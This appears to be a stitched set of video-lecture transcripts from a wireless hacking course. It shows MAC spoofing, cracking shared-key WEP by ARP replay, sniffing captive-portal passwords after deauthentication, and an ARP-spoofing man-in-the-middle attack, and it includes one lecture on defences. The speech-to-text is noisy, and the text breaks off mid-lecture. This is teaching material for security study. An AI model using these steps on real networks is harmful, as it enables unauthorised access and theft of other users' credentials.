00:08:20,040 --> 00:08:23,220
target network uses encryption, it uses a password.

126
00:08:23,220 --> 00:08:24,600
But you know the password.

127
00:08:24,600 --> 00:08:27,060
But it you still can't connect to it.

128
00:08:27,060 --> 00:08:32,220
Then there's a high chance that you are blacklisted from connecting to that network.

129
00:08:32,220 --> 00:08:38,150
So what you should do is change the Mac address of your wireless card and get back and try to connect.

130
00:08:38,160 --> 00:08:43,470
If you still can't connect, then there is a very high chance that they're using a whitelist instead

131
00:08:43,470 --> 00:08:44,430
of a blacklist.

132
00:08:44,430 --> 00:08:49,290
So in this case, you're going to have to put the wireless card in monitor mode, look for connected

133
00:08:49,290 --> 00:08:53,070
clients, and change your Mac address to one of these clients.

134
00:08:53,550 --> 00:08:59,070
Once you do that, you can come back and try to connect and you should be able to connect because your

135
00:08:59,070 --> 00:09:04,140
Mac address is going to be included in the whitelist and you'll be able to connect to the network.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,290 --> 00:00:06,590
Now, in this video, I'd like to cover a configuration that might be used on the target router that

2
00:00:06,590 --> 00:00:09,080
could make cracking it a little bit different.

3
00:00:09,380 --> 00:00:13,640
Now, as we know, WEP is very rare to see now anyway.

4
00:00:13,640 --> 00:00:19,040
And this configuration is actually really, really rare and most routers don't even support it.

5
00:00:19,680 --> 00:00:25,260
It is a bit different to crack it though, and usually people get confused when they see it and won't

6
00:00:25,260 --> 00:00:26,420
even know what to do.

7
00:00:26,430 --> 00:00:32,400
But it's actually kind of easier to crack this type of configuration than the normal web configuration.

8
00:00:32,700 --> 00:00:38,520
What I want to talk about is if the target router does not use open authentication.

9
00:00:38,610 --> 00:00:44,310
So we've seen in all the previous videos, the first step was to do a fake authentication attack which

10
00:00:44,310 --> 00:00:47,400
changed the auth and airodump ng to open.

11
00:00:47,520 --> 00:00:52,980
In this case, the router can be configured to use a shared key authentication.

12
00:00:52,980 --> 00:00:58,860
So I have my router settings page here and you can see that I changed the setting here to required.

13
00:00:58,860 --> 00:01:06,240
And what this basically does is it prevents anybody from even associating with the router if they don't

14
00:01:06,240 --> 00:01:07,080
know the key.

15
00:01:07,230 --> 00:01:14,670
So usually routers use open authentication, which basically means anybody can associate with the router

16
00:01:14,670 --> 00:01:17,610
and then the router will check if you have the right password.

17
00:01:17,610 --> 00:01:20,290
If you have the right key, if you do, they let you connect.

18
00:01:20,290 --> 00:01:22,090
If you don't, they won't let you to connect.

19
00:01:22,090 --> 00:01:25,690
So they actually allow you to associate and they'll communicate with you.

20
00:01:25,840 --> 00:01:32,800
If a shared key is used, then the router will not even allow you to associate unless you encrypt a

21
00:01:32,800 --> 00:01:34,780
challenge for it and send it to it.

22
00:01:34,810 --> 00:01:40,930
You won't even be able to associate with the router if you don't have this shared key.

23
00:01:41,230 --> 00:01:43,000
Let me show you an example here.

24
00:01:43,000 --> 00:01:47,740
So I'm just going to do, first of all, Airodump ng one zero to see all the networks around us.

25
00:01:50,640 --> 00:01:57,390
And you can see that I have this network which I configured for this class, and it's called Sqa Test

26
00:01:57,390 --> 00:01:57,720
AP.

27
00:01:58,560 --> 00:02:03,030
So it's running on Channel one and I'm going to copy its Mac address.

28
00:02:04,880 --> 00:02:08,090
And we're going to run airodump ng against this network only.

29
00:02:09,500 --> 00:02:11,150
We're going to give the side.

30
00:02:13,030 --> 00:02:14,050
The channel.

31
00:02:16,900 --> 00:02:21,880
And we're going to store the data to a file and we'll call the file SRC test.

32
00:02:23,960 --> 00:02:27,980
And then I'm going to put my wireless card in monitor mode, which is non-zero.

33
00:02:28,370 --> 00:02:30,560
So it's the same command that we've always been doing.

34
00:02:30,590 --> 00:02:34,040
Airodump ng, the BSI sid of the target the channel.

35
00:02:34,040 --> 00:02:37,100
And we're writing a file we're going to hit Enter.

36
00:02:37,990 --> 00:02:40,960
And this is going to run against our target only.

37
00:02:41,200 --> 00:02:47,080
And now I'm just going to come in and do a fake authentication just to show you what happens in Sqa

38
00:02:47,140 --> 00:02:47,770
networks.

39
00:02:47,770 --> 00:02:52,210
So we're going to do a fake authentication exactly like we did it before, So it's going to be aireplay

40
00:02:52,210 --> 00:02:52,510
ng.

41
00:02:54,260 --> 00:02:55,040
Fake auth.

42
00:02:56,300 --> 00:02:57,830
And we're going to put zero.

43
00:02:58,400 --> 00:03:00,710
And then we're going to do minus a.

44
00:03:01,730 --> 00:03:09,140
Put the Mac address of the router and then I'm going to do minus H and put my own Mac address, which

45
00:03:09,140 --> 00:03:09,860
is.

46
00:03:10,700 --> 00:03:14,840
Now I'm doing all this real quick because you should know all of this by now because we covered it in

47
00:03:14,840 --> 00:03:16,010
previous lectures.

48
00:03:17,200 --> 00:03:23,410
And my own Mac address is 00C0A828298.

49
00:03:24,690 --> 00:03:29,130
Then we're going to put our wireless card in monitor mode, which is mon zero.

50
00:03:30,420 --> 00:03:34,230
So again, same command that we always use for the fake authentication.

51
00:03:34,230 --> 00:03:38,310
We're going to do NG fake auth zero target.

52
00:03:38,310 --> 00:03:40,380
Mac address my Mac address.

53
00:03:40,380 --> 00:03:41,520
I'm going to hit enter.

54
00:03:44,020 --> 00:03:45,760
So I'm going to control C this.

55
00:03:47,380 --> 00:03:54,400
So you can see that we have ska here under the auth instead of open and that means we can't really do

56
00:03:54,400 --> 00:03:56,170
all the attacks that we did previously.

57
00:03:56,170 --> 00:03:59,860
The three methods, the three injection methods that we spoke about previously.

58
00:04:00,370 --> 00:04:07,810
The way to fake authenticate yourself with ska networks is you'll have to authenticate one of the connected

59
00:04:07,810 --> 00:04:08,740
clients in here.

60
00:04:08,740 --> 00:04:12,430
So you actually need you have to have a client connected to the network.

61
00:04:12,460 --> 00:04:14,500
You're going to have to authenticate it.

62
00:04:14,530 --> 00:04:18,580
Once you do that, Airodump ng will capture an SKA.

63
00:04:18,610 --> 00:04:25,390
You can see that I have a broken ska here, but if you do that properly you will get a normal ska and

64
00:04:25,390 --> 00:04:31,360
then you'll use that file with the minus y option to fake authenticate yourself to associate with the

65
00:04:31,360 --> 00:04:35,800
network and then you can do all the attacks that we spoke about in the previous lectures, the three

66
00:04:35,800 --> 00:04:36,490
methods.

67
00:04:36,790 --> 00:04:43,090
The thing is, that's a bit too complicated and there is two better methods to do that because as I

68
00:04:43,090 --> 00:04:49,360
said, if you want to associate and the target network uses SKA, the network has to have a connected

69
00:04:49,360 --> 00:04:52,180
client has to have at least one connected client.

70
00:04:52,180 --> 00:04:56,320
So based on that fact, there's actually better ways to crack that network.

71
00:04:56,320 --> 00:05:02,890
And I'm going to show you the first method right now, and that is using an ARP replay attack.

72
00:05:04,150 --> 00:05:05,800
So let me close this first.

73
00:05:09,030 --> 00:05:15,000
And I'm going to clear this and I'm actually going to stop this and clear it.

74
00:05:15,970 --> 00:05:20,310
And run the attack again, because I want to show you that you actually don't even need to run a fake

75
00:05:20,320 --> 00:05:21,860
authentication for this.

76
00:05:21,880 --> 00:05:23,980
So we're just going to name this something else.

77
00:05:23,980 --> 00:05:28,960
We're going to call it SRC Test two and we're going to launch Airodump NG.

78
00:05:29,230 --> 00:05:34,840
And as you can see right here, I don't have authentication or anything on this network right now.

79
00:05:35,080 --> 00:05:40,000
And what I'm going to do is I'm going to do an ARP replay attack.

80
00:05:40,000 --> 00:05:43,430
So we spoke about that and we actually did it in a previous lecture.

81
00:05:43,450 --> 00:05:49,570
The only difference is when we did it, we did a fake authentication and we associated with the network

82
00:05:49,570 --> 00:05:54,010
and then we used the replay attack based on our Mac address.

83
00:05:54,010 --> 00:06:01,840
So we replay packets from our computer and injected them in the router in this lecture because we actually

84
00:06:01,840 --> 00:06:02,410
have a client.

85
00:06:02,410 --> 00:06:06,700
When we did it in previous lectures, there was no client connected, so we had to associate.

86
00:06:06,700 --> 00:06:13,390
Our client showed up in here and then we used our client Mac address to replay one of the ARP packets

87
00:06:13,390 --> 00:06:16,970
and we managed to increase the number of data rapidly that way.

88
00:06:17,300 --> 00:06:22,610
What we're going to do today is because we already have a connected client, we're going to use this

89
00:06:22,610 --> 00:06:24,920
connected client in our replay attack.

90
00:06:25,400 --> 00:06:31,400
And this method will work against both normal networks and against the network, the Web networks that

91
00:06:31,400 --> 00:06:32,360
use ska.

92
00:06:33,600 --> 00:06:37,650
So this attack is going to be exactly the same as the replay attack that we did.

93
00:06:37,680 --> 00:06:42,840
The only difference is we're going to use the Mac address of a connected client instead of my own Mac

94
00:06:42,840 --> 00:06:43,560
address.

95
00:06:43,980 --> 00:06:45,870
So the command is going to be airplay.

96
00:06:47,770 --> 00:06:48,970
AAP replay.

97
00:06:51,000 --> 00:06:52,650
Then we're going to do minus B.

98
00:06:53,700 --> 00:06:57,840
And we're going to give it the Mac address of the target network.

99
00:06:58,050 --> 00:07:03,390
Then we're going to do minus H, and instead of giving it my own Mac address like we did in previous

100
00:07:03,390 --> 00:07:08,820
videos, I'm going to use the Mac address of one of the connected clients, which is this one.

101
00:07:12,910 --> 00:07:18,430
Then I'm going to put my wireless card in monitor mode, which is one zero, and we're ready to go.

102
00:07:18,430 --> 00:07:20,050
So again, we're using airplay.

103
00:07:20,650 --> 00:07:24,280
We're doing an ARP replay attack exactly like we did before.

104
00:07:24,310 --> 00:07:31,180
We're specifying the target network after the minus B, and then we're specifying the Mac address of

105
00:07:31,180 --> 00:07:32,920
a connected client this time.

106
00:07:32,920 --> 00:07:36,250
And instead of specifying my own Mac address.

107
00:07:37,010 --> 00:07:38,360
So I'm going to hit Enter.

108
00:07:40,380 --> 00:07:44,760
And what this is going to do is it's going to wait for an appropriate ARP packet.

109
00:07:44,760 --> 00:07:48,810
And once it captures one of them, it's going to inject it in the traffic.

110
00:07:48,810 --> 00:07:54,480
But when it's going to do that, it's actually relying on this connected client and it's injecting it

111
00:07:54,480 --> 00:07:58,680
as if this packet is coming from this connected client.

112
00:07:58,680 --> 00:08:02,760
And as you can see, the number of data is increasing very, very fast right now.

113
00:08:02,760 --> 00:08:08,400
And I can just run aircrack ng on this side and I should be able to crack the password.

114
00:08:08,960 --> 00:08:13,670
So again, I'm going to run this like we did before and we named the file SRC A.

115
00:08:14,910 --> 00:08:16,950
Test, and we named it two.

116
00:08:17,770 --> 00:08:24,640
And we have to append the -0 one because airodump ng does that automatically and that's going to be

117
00:08:24,640 --> 00:08:25,400
a cap.

118
00:08:26,420 --> 00:08:27,800
We're going to hit Enter.

119
00:08:30,990 --> 00:08:32,760
Now I'm going to stop this.

120
00:08:36,560 --> 00:08:39,050
And as you can see, we managed to get the key.

121
00:08:39,080 --> 00:08:40,160
Now we can use this.

122
00:08:40,190 --> 00:08:46,040
We just remove these dots from it and connect to the target network and we'll be able to connect to

123
00:08:46,040 --> 00:08:46,430
it.

124
00:08:47,380 --> 00:08:54,430
So again, this method works on both normal Web networks and the ones that use shared key authentication

125
00:08:54,430 --> 00:08:55,600
or ska.

126
00:08:56,320 --> 00:09:02,560
The only thing that it requires is an existing connected client to the network, so it's not a client

127
00:09:02,560 --> 00:09:03,820
less cracking method.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,770 --> 00:00:01,310
Okay.

2
00:00:01,310 --> 00:00:06,500
Now let's talk about how to secure your systems from the attacks that we've seen so far.

3
00:00:06,860 --> 00:00:10,610
So the first thing that we've seen was the the authentication attack.

4
00:00:10,820 --> 00:00:16,970
And we've seen how that can be used to disconnect any device from any network without having to know

5
00:00:16,970 --> 00:00:19,940
the network key, even if the network uses encryption.

6
00:00:20,330 --> 00:00:27,140
Now, unfortunately, there is no proper way of protecting against this attack, so there is no way

7
00:00:27,140 --> 00:00:31,190
for you to prevent people from sending the authentication packets.

8
00:00:32,000 --> 00:00:40,460
The only proper way to protect your systems from this attack is to move to the 802.11 standard.

9
00:00:41,090 --> 00:00:47,750
Now, this standard uses protected management frames, which is a method designed by Cisco to detect

10
00:00:47,750 --> 00:00:51,350
and protect against the authentication attacks.

11
00:00:51,590 --> 00:00:56,750
The only thing that you need to keep in mind is both the access point and the clients.

12
00:00:56,750 --> 00:01:01,110
Connecting to this access point need to support the standard.

13
00:01:01,590 --> 00:01:06,750
Now I'm going to include links in the resources of this lecture for more information about protected

14
00:01:06,750 --> 00:01:10,730
management frames and the 802.11 standard.

15
00:01:10,740 --> 00:01:13,800
So feel free to go and read more about it.

16
00:01:15,790 --> 00:01:20,470
The next thing that we've seen is how to discover the names of hidden networks.

17
00:01:20,920 --> 00:01:25,330
Now we've seen how easy it is to discover the names of hidden networks.

18
00:01:25,330 --> 00:01:31,000
So you simply shouldn't use that or think of that as a way of protecting a network.

19
00:01:31,030 --> 00:01:36,520
You can hide in the network name if you want, but don't think that will protect you from hackers.

20
00:01:37,630 --> 00:01:43,210
The next thing that we seen was bypassing Mac filtering, whether it's implemented, using a blacklist

21
00:01:43,210 --> 00:01:44,650
or a whitelist.

22
00:01:44,680 --> 00:01:47,020
Now we've seen how easy that is.

23
00:01:47,050 --> 00:01:52,780
And from that, you should already know that you shouldn't use Mac filtering for access control.

24
00:01:52,990 --> 00:01:59,950
If you want to be able to control the access of individual clients on your network, then don't rely

25
00:01:59,950 --> 00:02:01,150
on the Mac address.

26
00:02:01,180 --> 00:02:09,160
Instead, use WPA Enterprise with a Radius server so that you authenticate each user individually.

27
00:02:09,160 --> 00:02:15,070
So each user will have their own username and their own password, and this password will be sent using

28
00:02:15,070 --> 00:02:16,600
WPA or WPA to.

29
00:02:16,600 --> 00:02:23,080
So everything's going to be encrypted and secure and at the same time you'll be able to control the

30
00:02:23,080 --> 00:02:25,600
access for each individual user.

31
00:02:25,600 --> 00:02:30,610
So if there is a certain user that you want to deny them from connecting, you just delete their password

32
00:02:30,610 --> 00:02:31,930
from the radius server.

33
00:02:31,930 --> 00:02:34,420
So you never rely on the Mac address.

34
00:02:35,220 --> 00:02:38,910
Now I'm going to talk about WPA Enterprise later on in the course.

35
00:02:38,910 --> 00:02:44,850
So just wait for that lecture and you'll learn more about how they work and what they can be used for.

36
00:02:45,540 --> 00:02:53,070
But for now, switch to 802.11 if you can support it to prevent the authentication attacks.

37
00:02:53,100 --> 00:02:59,190
Never use hidden networks or at least don't think that using a hidden network will secure you or secure

38
00:02:59,190 --> 00:03:00,030
your network.

39
00:03:00,060 --> 00:03:06,120
Third, don't use blacklists or whitelists as a method of access control.

40
00:03:06,120 --> 00:03:07,830
Do not rely on the Mac address.

41
00:03:07,830 --> 00:03:14,340
If you want to control the access of clients connecting to your network, then use WPA Enterprise and

42
00:03:14,340 --> 00:03:17,760
we're going to talk about WPA Enterprise later on in the course.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 4: Gaining Access - Captive Portals

1
00:00:00,480 --> 00:00:06,030
Now, in this lecture and the next few lectures, I'd like to spend some time talking about captive

2
00:00:06,030 --> 00:00:13,170
portals and how to bypass them, captive portals are becoming very popular these days, and they're

3
00:00:13,200 --> 00:00:14,700
they're being used everywhere.

4
00:00:14,970 --> 00:00:21,480
You can see them in colleges, offices, companies, airports, hotels and so on.

5
00:00:22,740 --> 00:00:26,880
Usually the way a captive portal works is that it's an open network.

6
00:00:26,880 --> 00:00:29,750
So you can see it and you can connect to it without any encryption.

7
00:00:30,090 --> 00:00:36,180
And once you connect, you'll automatically see a login page that you have to log in so you can access

8
00:00:36,180 --> 00:00:36,780
the Internet.

9
00:00:37,380 --> 00:00:40,950
So in hotels, sometimes it asks you for the room number.

10
00:00:41,100 --> 00:00:43,850
Sometimes you have to pay to get a certain password.

11
00:00:44,010 --> 00:00:47,040
Sometimes you have to login with Facebook and so on.

12
00:00:47,820 --> 00:00:51,060
So let me just show you an example of a captive portal real quick right here.

13
00:00:51,600 --> 00:00:53,400
I have one set up here in the office.

14
00:00:53,730 --> 00:00:59,910
So if I go here, I just called it airport hotspot, just for an example, but it's actually not an

15
00:00:59,910 --> 00:01:00,900
airport network.

16
00:01:01,710 --> 00:01:03,630
So I'm going to connect to it right now.

17
00:01:04,350 --> 00:01:11,250
And you'll see automatically I see a login page that will ask me to enter a password to access the Internet.

18
00:01:11,910 --> 00:01:15,570
Now, if you're connecting through a phone, you'll see this as well.

19
00:01:15,660 --> 00:01:19,650
If you're connecting through OSX or Linux, you'll see you'll still see this.

20
00:01:19,650 --> 00:01:24,450
And you can see here on the top at the bar, it's telling me that I need to log in to access the Internet.

21
00:01:25,230 --> 00:01:28,800
So if I try to go to anything, if I try to go to a for example.

22
00:01:30,840 --> 00:01:34,800
You'll see I'll still be redirected to the hotspot Log-in.

23
00:01:36,800 --> 00:01:42,380
As you can see, the log in is done through a website, through a Web interface and even on phones,

24
00:01:42,590 --> 00:01:45,770
on Mac OS X, you'll see a pop up window shows up.

25
00:01:45,980 --> 00:01:50,290
But this popup window is just a Web browser without a navigation bar.

26
00:01:50,630 --> 00:01:57,020
So the data is being sent through a Web interface through HTTP or https.

27
00:01:58,430 --> 00:02:05,300
So looking at that, because the network is open, we can think of so many ways to steal the password

28
00:02:05,300 --> 00:02:08,750
or gain access to this network and bypass the login.

29
00:02:09,930 --> 00:02:16,280
Now, a very simple method would be to try and change your Mac address to one of a connected client.

30
00:02:16,850 --> 00:02:21,830
So all they have to do in this case is just open a road map and you look for connected clients in the

31
00:02:21,830 --> 00:02:27,410
second section of the program and then change your Mac address to the Mac address of a connected client

32
00:02:27,500 --> 00:02:28,730
using Mac changer.

33
00:02:29,840 --> 00:02:36,050
Now, this process is identical to the process that you follow to bypass whitelist filtering, and I

34
00:02:36,050 --> 00:02:37,600
covered that in a previous lecture.

35
00:02:37,850 --> 00:02:43,790
Therefore, I'm not going to cover the first method in here because it's literally going to be exactly

36
00:02:43,790 --> 00:02:47,510
the same method as the one I covered in the whitelist filtering.

37
00:02:48,620 --> 00:02:49,700
Well, I'm going to show you, though.

38
00:02:49,700 --> 00:02:53,250
I'm going to show you the three other methods that I think are very, very useful.

39
00:02:54,470 --> 00:02:58,160
The first method is going to be sniffing logins in monitor mode.

40
00:02:59,770 --> 00:03:04,960
Now, because, by definition, captive Porto's have to be open networks because, like I said, they're

41
00:03:04,960 --> 00:03:09,580
usually used in offices and hotels and so on, they're usually open.

42
00:03:09,580 --> 00:03:12,730
And then once you log in, they ask you for a username and password.

43
00:03:13,570 --> 00:03:19,540
So this means that we don't even need to connect and we'll be able to capture the data and read it in

44
00:03:19,540 --> 00:03:23,590
plain text unless the data is being sent over https.

45
00:03:25,090 --> 00:03:32,230
So we can just start monitor mode, sniffing the data, using dump, and you save it in a file and then

46
00:03:32,320 --> 00:03:38,440
read the file and look for a username and password in Wireshark once someone logs in.

47
00:03:39,280 --> 00:03:45,610
Now you can force someone to log in by running the authentication attack and wait for them to get disconnected.

48
00:03:45,730 --> 00:03:49,540
Then when they connect again, they usually get asked to enter the password again.

49
00:03:50,950 --> 00:03:52,330
So let's see how to do that.

50
00:03:52,450 --> 00:03:57,610
I'm going to go to Cali and first of all, I already have my wireless adapter connected.

51
00:03:57,620 --> 00:03:58,900
So if I do if config.

52
00:04:00,760 --> 00:04:05,680
You can see my wireless adapter now, I'm going to enable monitor mode on it real quick.

53
00:04:06,010 --> 00:04:06,850
We've covered this.

54
00:04:06,850 --> 00:04:08,770
We've covered how to do that in a number of ways.

55
00:04:08,770 --> 00:04:11,020
So that's why I'm just going to do it really quickly.

56
00:04:11,560 --> 00:04:14,650
So I'm going to do if config line zero down.

57
00:04:16,560 --> 00:04:20,190
Then I'm going to do it config zero mode monitor.

58
00:04:22,360 --> 00:04:26,770
And then I'm going to do if config lines up to bring the card up.

59
00:04:27,810 --> 00:04:29,340
Sorry, I forgot to put up.

60
00:04:31,440 --> 00:04:38,940
And now it's in monitor mode, so if we do it config, we can see that the card is in waita mode, so

61
00:04:38,940 --> 00:04:39,690
that's perfect.

62
00:04:40,110 --> 00:04:45,780
Now, the next step, I'm going to just run Aradigm Punji against all the networks around me.

63
00:04:45,780 --> 00:04:48,510
So I'm just going to do Erro Dump Engie Lazerow.

64
00:04:53,270 --> 00:04:58,910
OK, now we have our target, we can see it right here, second airport, hot hotspot, we can see that

65
00:04:58,910 --> 00:05:03,520
it's an open network, it's on Channel 12 and we can see it's Mac address.

66
00:05:04,370 --> 00:05:10,180
So, as usual, we want to run against this specific network again, who we've done this a lot before.

67
00:05:10,190 --> 00:05:11,600
So I'm going to do it a bit quickly.

68
00:05:11,750 --> 00:05:13,370
I'm going to copy the Mac address.

69
00:05:15,460 --> 00:05:17,320
And I'm going to run errands, punji.

70
00:05:18,370 --> 00:05:20,170
I'm going to give you the best idea.

71
00:05:21,910 --> 00:05:28,480
And the channel, which is 12, and then I'm going to write everything.

72
00:05:30,180 --> 00:05:36,000
To our final and let's call that final airport, because the network is called Airport Hotspot.

73
00:05:36,960 --> 00:05:41,720
And finally, we'll give the name of our wireless card in monitor mode, which is land zero.

74
00:05:43,020 --> 00:05:46,410
So very simple command that we run multiple times.

75
00:05:46,590 --> 00:05:48,860
The first thing we do is we do a roadmap.

76
00:05:48,870 --> 00:05:53,340
And you were given the best idea, which is the Mac address of the Target network.

77
00:05:53,520 --> 00:05:58,320
We're given the channel that the Target network is working on and we can see it working on Channel 12,

78
00:05:58,590 --> 00:05:59,400
we're saying.

79
00:05:59,400 --> 00:06:05,640
Right, because we want to store all the captured data in a file and we're calling that file airport.

80
00:06:06,090 --> 00:06:09,900
And finally, we have to give the name of the wireless interface and monitor mode.

81
00:06:10,020 --> 00:06:11,670
And in my case, it's line zero.

82
00:06:12,810 --> 00:06:13,770
I'm going to hit enter.

83
00:06:15,740 --> 00:06:22,010
And as you can see now, energy is working and we can see that we have a connected client already.

84
00:06:22,430 --> 00:06:28,160
Now, like I said, if the client is connected and is using the Internet, you can just do the authentication

85
00:06:28,160 --> 00:06:30,280
attack and get it disconnected for a while.

86
00:06:31,550 --> 00:06:34,580
I'm not going to do that because I don't want to make the lecture too long.

87
00:06:34,580 --> 00:06:35,590
We've already covered that.

88
00:06:35,750 --> 00:06:40,520
So we're just going to assume that we did the authenticate our target and now our target is going to

89
00:06:40,520 --> 00:06:42,320
go ahead and try to connect again.

90
00:06:42,710 --> 00:06:44,360
So I have my Windows machine here.

91
00:06:44,600 --> 00:06:45,800
I'm going to close this.

92
00:06:49,730 --> 00:06:52,340
And I'm actually going to disconnect from the network.

93
00:06:55,650 --> 00:06:57,420
And then I'm going to connect to it again.

94
00:07:01,840 --> 00:07:07,510
Now, as you can see, we automatically get the login page again, we're assuming that the user, this

95
00:07:07,510 --> 00:07:13,990
specific user, already have a password, whether they are they're staying in this hotel or this airport

96
00:07:13,990 --> 00:07:19,160
or whether they actually bought a membership to access the Internet to access this Wi-Fi network.

97
00:07:19,180 --> 00:07:19,930
We don't care.

98
00:07:20,180 --> 00:07:24,610
Now the user is going to enter their password and we're going to assume that it's one, two, three,

99
00:07:24,610 --> 00:07:26,000
four, five, six.

100
00:07:26,020 --> 00:07:27,640
This is actually a valid password.

101
00:07:27,880 --> 00:07:28,960
We're going to log in.

102
00:07:30,580 --> 00:07:35,230
And will be redirected to Google, so this user got their Internet access and they're happy they can

103
00:07:35,230 --> 00:07:36,580
go and do whatever they want.

104
00:07:37,360 --> 00:07:40,600
Now, let's go to the candy machine and see if we capture the password.

105
00:07:42,020 --> 00:07:43,640
I'm going to control see out of this.

106
00:07:45,620 --> 00:07:48,950
And then I'm going to run Wireshark so we can just do Wireshark in here.

107
00:07:53,910 --> 00:07:55,260
I'm going to go to file.

108
00:07:56,930 --> 00:07:57,500
Open.

109
00:07:59,020 --> 00:08:05,400
And open the file that we just captured, so we called the file airport and we're looking for the cap

110
00:08:05,440 --> 00:08:06,120
extension.

111
00:08:06,400 --> 00:08:09,850
So as you can see, we have a file here called Airport zero one dot cap.

112
00:08:10,600 --> 00:08:14,510
I'm going to open it, like I said before, erodable.

113
00:08:14,590 --> 00:08:20,350
And you automatically appends minus zero one to the name that you pick when you create the file.

114
00:08:21,160 --> 00:08:27,370
And right here we have all the packets that we captured that were sent to the target network, to the

115
00:08:27,370 --> 00:08:28,360
airport network.

116
00:08:29,530 --> 00:08:35,690
Now, what we're interested in is the TTP traffic, because as we see in the username and password,

117
00:08:35,690 --> 00:08:37,960
they are being sent over HTTP.

118
00:08:39,160 --> 00:08:42,250
So in the theater here, I'm just going to type in HTTP.

119
00:08:43,670 --> 00:08:51,530
Hit Enter and Wireshark right here is only showed me deep pockets now log in forums and such forums

120
00:08:51,530 --> 00:08:57,170
are usually sent over posts, so we want to look for a post request here instead of get.

121
00:08:58,180 --> 00:09:01,930
So I'm going to scroll down until I find a post request.

122
00:09:03,320 --> 00:09:11,900
So you can see we have one here, I'm going to go down and look for the HTML form URL encoded and we

123
00:09:11,900 --> 00:09:15,110
can see that in here, we actually don't have anything interesting.

124
00:09:16,100 --> 00:09:19,400
So I'm just going to keep going looking for more post requests.

125
00:09:21,060 --> 00:09:22,040
I have another one here.

126
00:09:23,810 --> 00:09:28,280
And this one looks interesting because we can see that there is an operation called Log In, and here

127
00:09:28,940 --> 00:09:34,580
we can see that the username is set to nothing and we can see the password reset to one, two, three,

128
00:09:34,580 --> 00:09:35,690
four, five, six.

129
00:09:37,200 --> 00:09:42,390
So that's it, we have the password now, we can just go to the network manager here in Cali, connect

130
00:09:42,390 --> 00:09:45,540
to the network, put the password the same way that the user put it.

131
00:09:45,540 --> 00:09:46,920
One, two, three, four, five, six.

132
00:09:47,280 --> 00:09:51,420
And we'll be able to connect the network and we'll have a proper, legitimate access.

133
00:09:51,630 --> 00:09:56,640
And instead of changing the Mac address where you might get caught because they'll be too much addresses

134
00:09:56,640 --> 00:09:58,440
connected to the same network.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,140 --> 00:00:05,270
In this lecture, I'd like to show you another way of bypassing Kafka portals.

2
00:00:06,000 --> 00:00:13,320
Since the captive portal is an open network, we can just connect to it normally and once we connect,

3
00:00:13,320 --> 00:00:17,100
we'll get an IP address and everything and what we'll do.

4
00:00:17,100 --> 00:00:20,940
In that case, we'll run a normal ARP spoofing attack.

5
00:00:21,420 --> 00:00:26,970
Now, as we know, this attack will place us in the middle of the connection between the client and

6
00:00:26,970 --> 00:00:27,780
the router.

7
00:00:27,780 --> 00:00:34,200
And this way all the data will flow through our computer, including usernames, passwords, URLs and

8
00:00:34,200 --> 00:00:34,980
everything.

9
00:00:35,700 --> 00:00:40,920
The advantage of this method is because the data will flow through our computer.

10
00:00:40,920 --> 00:00:42,840
So we're going to become the man in the middle.

11
00:00:42,840 --> 00:00:49,470
And because we don't have internet access through this network, then when we do this attack, the clients

12
00:00:49,470 --> 00:00:55,860
that we're targeting will automatically lose their connection and will automatically be asked to enter

13
00:00:55,860 --> 00:01:01,260
the username and password without having to do the authentication attack for us.

14
00:01:01,830 --> 00:01:08,900
The reason for this, like I said, because every request they send will be redirected to our computer.

15
00:01:08,920 --> 00:01:11,500
Our computer will send the request to the router.

16
00:01:11,530 --> 00:01:14,380
The response will be that we don't have connection.

17
00:01:14,380 --> 00:01:19,630
The router will ask us to log in so that the response will be forwarded to the client and the client

18
00:01:19,630 --> 00:01:22,540
will automatically be asked to log in again.

19
00:01:23,280 --> 00:01:24,480
So let me show you.

20
00:01:24,720 --> 00:01:29,820
I have my windows machine here and this Windows machine is connected so we can search for anything.

21
00:01:29,820 --> 00:01:32,730
We can search for test, for example, and that will work.

22
00:01:32,730 --> 00:01:35,100
So this machine has Internet connection.

23
00:01:35,100 --> 00:01:39,450
It's already authenticated with the network and they're happy they're using their Internet connection.

24
00:01:39,900 --> 00:01:42,450
Now, what we're going to do is we're going to go back to Cali.

25
00:01:42,480 --> 00:01:44,880
We'll first connect to the network.

26
00:01:44,880 --> 00:01:46,590
So I'm going to go up.

27
00:01:46,590 --> 00:01:51,180
I'm my wireless adapter is already connected to Cali and it's in managed mode.

28
00:01:51,180 --> 00:01:55,560
It's not in monitor mode because you can't connect to networks when you're in monitor mode.

29
00:01:55,740 --> 00:01:58,830
So I'm going to go on the Wi-Fi.

30
00:01:58,860 --> 00:02:01,110
I'm going to select a network.

31
00:02:02,170 --> 00:02:05,800
And I'm going to select my target network, which is airport hotspot.

32
00:02:07,660 --> 00:02:09,130
I'm going to connect.

33
00:02:11,220 --> 00:02:13,860
And wait for it until it gets connected.

34
00:02:14,620 --> 00:02:19,840
And now that I'm connected, I'm just going to go on Firefox just to show you that I actually don't

35
00:02:19,840 --> 00:02:20,740
have connection now.

36
00:02:20,740 --> 00:02:24,220
So I'm just connected to the network, but I don't have internet connection.

37
00:02:24,220 --> 00:02:27,730
I have to log in, put my username and password to access the internet.

38
00:02:28,740 --> 00:02:31,440
So let's try to go to Bing.com.

39
00:02:32,740 --> 00:02:36,070
And as you can see, I get asked to enter a password.

40
00:02:36,750 --> 00:02:38,640
So we're coming here.

41
00:02:38,640 --> 00:02:41,970
We're going to do a normal ARP spoofing attack.

42
00:02:42,120 --> 00:02:44,610
So there is a number of ways to do this.

43
00:02:44,640 --> 00:02:50,130
You can use Arpspoof like I showed you before and then sniff the data using Wireshark.

44
00:02:50,880 --> 00:02:55,050
Alternatively, you can use man in the middle and just do man in the middle.

45
00:02:55,050 --> 00:02:57,810
F arpspoof.

46
00:02:58,050 --> 00:03:06,000
Give it the interface which is lan zero set the gateway which is in our case, we can just split the

47
00:03:06,000 --> 00:03:09,810
screen here and do root n.

48
00:03:11,010 --> 00:03:14,240
And we can see it's 19216821.

49
00:03:14,250 --> 00:03:20,340
So we'll just do 19216821 hit enter.

50
00:03:20,340 --> 00:03:25,170
It will put you in the middle of the connection and then when the target enters the password, you'll

51
00:03:25,170 --> 00:03:25,950
capture it.

52
00:03:26,850 --> 00:03:31,680
Now, I've already showed you how to use man in the middle life before, and I know some people actually

53
00:03:31,680 --> 00:03:34,500
